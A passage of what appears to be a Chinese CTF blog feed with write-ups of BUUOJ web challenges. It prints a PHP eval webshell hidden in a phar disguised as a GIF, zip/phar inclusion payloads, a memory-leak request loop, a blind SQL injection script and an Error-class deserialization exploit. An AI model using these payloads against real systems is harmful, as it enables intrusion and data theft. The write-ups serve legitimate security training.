class="hljs-string">&quot;assets/img/upload/&quot;</span>.$upload_name);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;&#125;&#125;&#125;  <span class="hljs-meta">?&gt;</span></code></pre><p>登录里面</p><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> and <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])</code></pre><p>用户名是强等于，密码要与session值相等，但在login.php里提到<code>$_SESSION['password'] = mt_rand();</code>,我们不能得到seed，当我们可以把session删掉，让passwd置空这样也可以达到相等，passwd为必须，但在前端可以删除require：</p><p><img src="/2021/08/07/hate/4.png" alt="4"></p><p>登录后是前面得到源码的页面，我们可以传个🐎，但是有限制图片格式，最后会解析成图片，可以用伪协议绕过，phar或者zip都可以。</p><h4 id="zip"><a class="header-anchor" href="#zip">🍭</a>zip://</h4><p>写个一句话添加到压缩文件，生成一个.zip ，改个后缀， 上传，</p><pre><code class="hljs awk">zip:<span class="hljs-regexp">//</span> + zip路径 + %<span class="hljs-number">23</span> + php文件名?page=zip:<span class="hljs-regexp">//</span>assets<span class="hljs-regexp">/img/u</span>pload/xxx.jpg%<span class="hljs-number">23</span>zip<span class="hljs-comment">#index.php包含的时候默认加上了php后缀</span></code></pre><p>蚁剑连接</p><img src="/2021/08/07/hate/2.png" alt="2" style="zoom:67%;"><h4 id="phar"><a class="header-anchor" href="#phar">🍭</a>phar://</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;    <span class="hljs-keyword">public</span> $content;    <span class="hljs-keyword">public</span> $pattern;    <span class="hljs-keyword">public</span> $suffix;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$content</span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;content = $content;        <span class="hljs-keyword">$this</span>-&gt;pattern = <span class="hljs-string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;suffix = <span class="hljs-string">&quot;.php&quot;</span>;    &#125;&#125;@unlink(<span class="hljs-string">&quot;zip.phar&quot;</span>);$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;zip.phar&quot;</span>);$phar-&gt;startBuffering();$phar-&gt;setStub(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub, 增加gif文件头，伪造文件类型</span>$o = <span class="hljs-keyword">new</span> Template(<span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>);$phar-&gt;setMetadata($o); <span class="hljs-comment">//将自定义meta-data存入manifest</span>$phar-&gt;addFromString(<span class="hljs-string">&quot;test.php&quot;</span>, <span class="hljs-string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><span class="hljs-comment">//签名自动计算</span>$phar-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p>读取</p><pre><code class="hljs undefined">?page&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;assets&#x2F;img&#x2F;xxx.jpg&#x2F;test</code></pre><p>参考：<a href="https://blog.init-new-world.com/post/BUUOJ-Web-ti-mu-15.html#toc-cb8">https://blog.init-new-world.com/post/BUUOJ-Web-ti-mu-15.html#toc-cb8</a></p>]]></content>
    
    
    <categories>
      
      <category>zip 软链接</category>
      
      <category>flask-session 伪造</category>
      
    </categories>
    
    
    <tags>
      
      <tag>zip://</tag>
      
      <tag>phar://</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu（六）</title>
    <link href="/2021/08/05/num/"/>
    <url>/2021/08/05/num/</url>
    
    <content type="html"><![CDATA[<h1>[HITCON 2016]Leaking</h1><p>这题有个新知识点：JS通过<code>Buffer</code> 类处理二进制数据的缓冲区</p><p>源码：</p><p><img src="/2021/08/05/num/3.png" alt="3"></p><p>vm2就可以看出是node.js了。</p><h5 id="tips："><a class="header-anchor" href="#tips：">🍭</a>tips：</h5><p>在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。</p><p>Buffer：<br>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。但在处理像<strong>TCP流</strong>或<strong>文件流</strong>时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer类，该类用来创建一个专门存放二进制数据的缓存区。只要是调用过的变量，一定会存在内存中，所以需要使用<code>Buffer()</code>来读取内存，使用<code>data=Buffer(800)</code>分配一个<code>800</code>的单位为<code>8</code>位字节的<code>buffer</code></p><p>exp：</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> requests<span class="hljs-attribute">import</span> time<span class="hljs-attribute">url</span> = &#x27;http://f<span class="hljs-number">81437</span>d<span class="hljs-number">1</span>-e<span class="hljs-number">54</span>b-<span class="hljs-number">44</span>db-bc<span class="hljs-number">22</span>-<span class="hljs-number">3634</span>ab<span class="hljs-number">84</span>cd<span class="hljs-number">3</span>c.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/?data=Buffer(<span class="hljs-number">500</span>)&#x27;<span class="hljs-attribute">while</span> True:        <span class="hljs-attribute">r</span> = requests.get(url)        <span class="hljs-attribute">time</span>.sleep(<span class="hljs-number">0</span>.<span class="hljs-number">1</span>)        <span class="hljs-attribute">print</span>(&#x27;trying&#x27;)        <span class="hljs-attribute">if</span> &#x27;flag&#123;&#x27; in r.text:            <span class="hljs-attribute">print</span>(r.text)            <span class="hljs-attribute">break</span></code></pre><p><img src="/2021/08/05/num/4.png" alt="4"></p><p>参考：<a href="https://bbs.huaweicloud.com/blogs/238020">https://bbs.huaweicloud.com/blogs/238020</a></p><h1>hatenum</h1><h4 id="分析源码"><a class="header-anchor" href="#分析源码">🍭</a>分析源码</h4><p><img src="/2021/08/05/num/1.png" alt="1">登录需要用户名密码验证码，会回显三种状态。</p><p><img src="/2021/08/05/num/2.png" alt="2"></p><p>滤了一系列字符,包括单引号，限制字符长度在9个以内。</p><h4 id="绕过"><a class="header-anchor" href="#绕过">🍭</a>绕过</h4><p>本题只需要获取密码，登录即可。查询语句：</p><p><code>&quot;select * from users where username='$username' and password='$password'&quot;</code></p><p>这题跟[NCTF2019]SQLi很像，一样的查询语句，限制就不一样了，所以我们采取一样的绕过方式（反斜杠转义）</p><pre><code class="hljs routeros">select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">&#x27;||注入语句#&quot;</span></code></pre><h4 id="盲注"><a class="header-anchor" href="#盲注">🍭</a>盲注</h4><p>exp()函数造成double数值类型超出范围（exp溢出）</p><blockquote><p>MySQL exp(x)函数 返回e(自然对数的底)的x次方的值，但是这个数学函数有一个问题，那就是当传递一个大于709的值时，函数exp()就会引起一个溢出错误.</p><img src="/2021/08/05/num/8.png" alt="8" style="zoom:67%;"><p>将0按位取反就会返回“18446744073709551615”。再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。</p><img src="/2021/08/05/num/9.png" alt="9" style="zoom:67%;"><p>通过子查询与按位求反，造成一个“DOUBLE value is out of range”错误，并借由此注出数据</p><p><img src="/2021/08/05/num/10.png" alt="10"></p><p>(本地没测试出来，可能是配置问题，dvwa上可以)</p></blockquote><h4 id="like-rlike-regexp"><a class="header-anchor" href="#like-rlike-regexp">🍭</a>like,rlike,regexp</h4><ul><li><p>like的内容不是正则，而是通配符。</p></li><li><p>rlike的内容可以是正则，正则的写法与java一样。需要转义，例如’\m’需要使用’\m’</p></li><li><p>regexp == rlike</p></li></ul><p>本题regexp也被ban了，这里用rlike代替。</p><p>题目中对hex长度进行了限制，需将字符转为十六进制（username进行匹配的涉及admin字符也要），<strong>且每三位推一位，最开始三位通过<code>^</code>和<code>$</code>的方式来匹配。</strong></p><p>构造盲注脚本：</p><pre><code class="hljs vim">import requests <span class="hljs-keyword">as</span> rimport <span class="hljs-built_in">string</span>url = <span class="hljs-string">&quot;http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn&quot;</span><span class="hljs-keyword">pt</span> = <span class="hljs-built_in">string</span>.ascii_letters+<span class="hljs-built_in">string</span>.digits+<span class="hljs-string">&quot;$&quot;</span>   //导入<span class="hljs-keyword">a</span>-<span class="hljs-keyword">z</span>,A-Z,<span class="hljs-number">0</span>-<span class="hljs-number">9</span>def str2hex(raw):    <span class="hljs-keyword">ret</span> = <span class="hljs-string">&#x27;0x&#x27;</span>    <span class="hljs-keyword">for</span> i in ra<span class="hljs-variable">w:</span>        <span class="hljs-keyword">ret</span> += hex(ord(i))[<span class="hljs-number">2</span>:].rjust(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;0&#x27;</span>)    <span class="hljs-keyword">return</span> <span class="hljs-keyword">ret</span>ans = <span class="hljs-string">&quot;&quot;</span>tmp = <span class="hljs-string">&quot;^&quot;</span><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):    <span class="hljs-keyword">for</span> ch in <span class="hljs-keyword">p</span><span class="hljs-variable">t:</span>            payload = <span class="hljs-keyword">f</span><span class="hljs-string">&quot;||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(code rlike binary &#123;str2hex(tmp+ch)&#125;))#&quot;</span>        payload = payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,chr(<span class="hljs-number">0</span>x0c))        data = &#123;            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;eki\\&quot;</span>,            <span class="hljs-string">&quot;password&quot;</span>:payload,            <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>        &#125;        req = r.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,data=data,allow_redirects=False)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;fail&#x27;</span> in req.tex<span class="hljs-variable">t:</span>            ans += ch            <span class="hljs-keyword">print</span>(tmp+ch,ans)            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">3</span>:                tmp = tmp[<span class="hljs-number">1</span>:]+ch            <span class="hljs-keyword">else</span>:                tmp += ch            <span class="hljs-keyword">break</span></code></pre><p>执行</p><img src="/2021/08/05/num/11.png" alt="11" style="zoom:50%;"><p>将顺序调换</p><pre><code class="hljs nix">for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">24</span>):    for ch <span class="hljs-keyword">in</span> pt:        <span class="hljs-attr">payload</span> = f<span class="hljs-string">&quot;||1 &amp;&amp; username rlike 0x61646d &amp;&amp; exp(710-(code rlike binary &#123;str2hex(ch+tmp)&#125;))#&quot;</span>               <span class="hljs-attr">payload</span> = payload.replace(&#x27; &#x27;,chr(<span class="hljs-number">0</span>x0c))        <span class="hljs-attr">data</span> = &#123;            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;eki\\&quot;</span>,            <span class="hljs-string">&quot;password&quot;</span>:payload,            <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>        &#125;        <span class="hljs-attr">req</span> = r.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,<span class="hljs-attr">data=data,allow_redirects=False)</span>        <span class="hljs-keyword">if</span> &#x27;fail&#x27; <span class="hljs-keyword">in</span> req.text:            <span class="hljs-attr">rev_ans</span> = ch+rev_ans            print(ch+tmp,rev_ans)            <span class="hljs-keyword">if</span> len(tmp) == <span class="hljs-number">3</span>:                <span class="hljs-attr">tmp</span> = ch+tmp[:-<span class="hljs-number">1</span>]            <span class="hljs-keyword">else</span>:                <span class="hljs-attr">tmp</span> = ch+tmp            break</code></pre><p>执行</p><img src="/2021/08/05/num/12.png" alt="12" style="zoom:67%;"><p>结合一下得到23位的code<code>erghruigh2uygh23uiu32ig</code>，提交</p><pre><code class="hljs xl"><span class="hljs-keyword">import</span> requests url = <span class="hljs-string">&quot;http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn&quot;</span><span class="hljs-keyword">data</span> = &#123;    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;||1#&quot;</span>,    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;erghruigh2uygh23uiu32ig&quot;</span>&#125;req = r.post(url+<span class="hljs-string">&quot;/login.php&quot;</span>,<span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>)print(req.<span class="hljs-keyword">text</span>)</code></pre><p>得到报文</p><p><img src="/2021/08/05/num/13.png" alt="13"></p><h1>[极客大挑战 2020]Greatphp</h1><p>分析源码，题目绕过类型很常见，一般情况下只需要使用数组即可绕过，但是这里是在类里面，不能这么做。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;great&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>我们可以用Error类绕过md5和sha1检测</p><img src="/2021/08/05/num/5.png" alt="5" style="zoom:50%;"><p>Error类中有<code>__tostring</code>方法，md5()和sha1()函数都会调用<code>__tostring()</code>,测试一下：</p><p>先单个：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">#结果：Error: payload in /box/script.php:2Stack trace:#0 &#123;main&#125;</span></code></pre><p>会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。</p><p>两个参数：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);$b = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<span class="hljs-keyword">echo</span> $a;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">echo</span> $b;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>($a != $b)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;a!=b&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span>(md5($a) === md5($b))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;md5&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">if</span>(sha1($a)=== sha1($b))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sha1&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>结果：</p><p><img src="/2021/08/05/num/6.png" alt="6"></p><blockquote><p>$a 和 $b 这两个对象本身不同，但<code>__toString</code>方法返回的结果是相同的，参数在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p><p>Exception 类与 Error 的使用和结果完全一样， Exception 类适用于PHP 5和7，而Error 只适用于 PHP 7。<br>将代码中的 $syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同，<code>__toString</code>方法输出的结果相同即可。</p><p>题目用preg_match过滤了小括号无法调用函数，用 include “/flag” 将flag包含进来即可；过滤了引号，url取反绕过即可。</p></blockquote><p>exp：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;    <span class="hljs-keyword">public</span> $syc;    <span class="hljs-keyword">public</span> $lover;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>( (<span class="hljs-keyword">$this</span>-&gt;syc != <span class="hljs-keyword">$this</span>-&gt;lover) &amp;&amp; (md5(<span class="hljs-keyword">$this</span>-&gt;syc) === md5(<span class="hljs-keyword">$this</span>-&gt;lover)) &amp;&amp; (sha1(<span class="hljs-keyword">$this</span>-&gt;syc)=== sha1(<span class="hljs-keyword">$this</span>-&gt;lover)) )&#123;           <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;syc, $match))&#123;               <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span>-&gt;syc);           &#125; <span class="hljs-keyword">else</span> &#123;               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);           &#125;                   &#125;    &#125;&#125;$str = <span class="hljs-string">&quot;?&gt;&lt;?=include~&quot;</span>.urldecode(<span class="hljs-string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="hljs-string">&quot;?&gt;&quot;</span>;$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">1</span>);$b=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>($str,<span class="hljs-number">2</span>);$c = <span class="hljs-keyword">new</span> SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;<span class="hljs-keyword">echo</span>(urlencode(serialize($c)));<span class="hljs-meta">?&gt;</span></code></pre><img src="/2021/08/05/num/7.png" alt="7" style="zoom: 50%;"><p>参考：<a href="https://blog.csdn.net/fmyyy1/article/details/117162062">https://blog.csdn.net/fmyyy1/article/details/117162062</a></p>]]></content>
    
    
    <categories>
      
      <category>沙箱逃逸</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP原生类</tag>
      
      <tag>exp溢出</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF2020||EzPHP</title>
    <link href="/2021/08/04/ez/"/>
    <url>/2021/08/04/ez/</url>
    
    <content type="html"><![CDATA[<p>查看源码，提示GFXEIM3YFZYGQ4A=，base32解码，获取源码</p><pre><code class="hljs coq">&lt;?phphighlight_file(__FILE__);error_reporting(<span class="hljs-number">0</span>); $file = <span class="hljs-string">&quot;1nD3x.php&quot;</span>;$shana = $_GET[&#x27;shana&#x27;];$passwd = $_GET[&#x27;passwd&#x27;];$arg = &#x27;&#x27;;$code = &#x27;&#x27;;echo <span class="hljs-string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<span class="hljs-keyword">if</span>($_SERVER) &#123;     <span class="hljs-keyword">if</span> (        preg_match(&#x27;/shana|<span class="hljs-type">debu</span>|<span class="hljs-type">aqua</span>|<span class="hljs-type">cute</span>|<span class="hljs-type">arg</span>|<span class="hljs-type">code</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">system</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">passwd</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\$|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">print</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">\.|\&quot;|\&#x27;|log</span>/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])        )          die(&#x27;You seem to want to <span class="hljs-built_in">do</span> something bad?&#x27;); &#125;<span class="hljs-keyword">if</span> (!preg_match(&#x27;/http|<span class="hljs-type">https</span>/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;    <span class="hljs-keyword">if</span> (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123;         $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>];         echo <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;    &#125; &#125; <span class="hljs-keyword">else</span> die(&#x27;fxck you! What <span class="hljs-built_in">do</span> you want to <span class="hljs-built_in">do</span> ?!&#x27;);<span class="hljs-keyword">if</span>($_REQUEST) &#123;     foreach($_REQUEST <span class="hljs-built_in">as</span> $value) &#123;         <span class="hljs-keyword">if</span>(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))              die(&#x27;fxck you! I hate English!&#x27;);     &#125; &#125; <span class="hljs-keyword">if</span> (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)    die(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<span class="hljs-keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[<span class="hljs-string">&quot;flag&quot;</span>]);    echo <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span>&#123;    die(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);&#125;<span class="hljs-keyword">if</span>(preg_match(&#x27;/^[a-z0<span class="hljs-number">-9</span>]*$/isD&#x27;, $code) |<span class="hljs-type">| </span><span class="hljs-type">preg_match</span>(&#x27;/fil|<span class="hljs-type">cat</span>|<span class="hljs-type">more</span>|<span class="hljs-type">tail</span>|<span class="hljs-type">tac</span>|<span class="hljs-type">less</span>|<span class="hljs-type">head</span>|<span class="hljs-type">nl</span>|<span class="hljs-type">tailf</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\`|\&#123;|\%|x</span>|<span class="hljs-type">\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">print</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">1f</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">con</span>|<span class="hljs-type">rot</span>|<span class="hljs-type">input</span>|<span class="hljs-type">\.|log</span>|<span class="hljs-type">\^/i</span>&#x27;, $arg) ) &#123;     die(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); &#125; <span class="hljs-keyword">else</span> &#123;     include <span class="hljs-string">&quot;flag.php&quot;</span>;    $code(&#x27;&#x27;, $arg); &#125; ?&gt;</code></pre><p>有多个绕过。</p><h5 id="绕过-QUERY-STRING-的正则匹配"><a class="header-anchor" href="#绕过-QUERY-STRING-的正则匹配">🍭</a>绕过 QUERY_STRING 的正则匹配</h5><p><code>$_SERVER[&quot;QUERY_STRING&quot;] 获取查询语句，获取的是?后面的值</code></p><pre><code class="hljs gherkin">if($_SERVER) &#123;    if (    preg_match(&#x27;/shana|<span class="hljs-string">debu</span>|<span class="hljs-string">aqua</span>|<span class="hljs-string">cute</span>|<span class="hljs-string">arg</span>|<span class="hljs-string">code</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">system</span>|<span class="hljs-string">exec</span>|<span class="hljs-string">passwd</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">print</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><span class="hljs-string">    )</span><span class="hljs-string">        die(&#x27;You seem to want to do something bad?&#x27;);</span><span class="hljs-string">&#125;</span></code></pre><p><code>$_SERVER['QUERY_STRING']</code>不进行URLDecode，<code>$_GET[]</code>会，所以只要进行url编码即可绕过</p><h5 id="绕过-xxx-类型的正则匹配"><a class="header-anchor" href="#绕过-xxx-类型的正则匹配">🍭</a>绕过/^xxx$/类型的正则匹配</h5><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, 